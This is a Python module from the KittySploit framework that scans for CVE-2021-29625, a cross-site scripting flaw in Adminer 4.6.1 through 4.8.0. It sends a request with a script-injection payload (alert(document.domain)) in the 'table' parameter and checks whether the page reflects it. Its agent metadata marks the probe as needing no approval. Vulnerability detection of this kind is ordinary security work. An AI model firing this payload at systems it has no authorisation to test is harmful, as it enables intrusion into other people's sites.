#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adminer 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adminer <=4.8.0 - Cross-Site Scripting Detection',
        'description': 'Adminer 4.6.1 to 4.8.0 contains a cross-site scripting vulnerability which affects users of MySQL, MariaDB, PgSQL, and SQLite in browsers without CSP when Adminer uses a `pdo_` extension to communicate with the database (it is used if the native extensions are not enabled).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'adminer', 'xss', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://sourceforge.net/p/adminer/bugs-and-features/797/',
            'https://github.com/vrana/adminer/commit/4043092ec2c0de2258d60a99d0c5958637d051a7',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-29625',
            'https://github.com/vrana/adminer/security/advisories/GHSA-2v82-5746-vwqc',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-29625',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        server = r.headers.get("Server") or r.headers.get("server") or ""
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Adminer <=4.8.0 - Cross-Site Scripting detected",
                path='/?server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

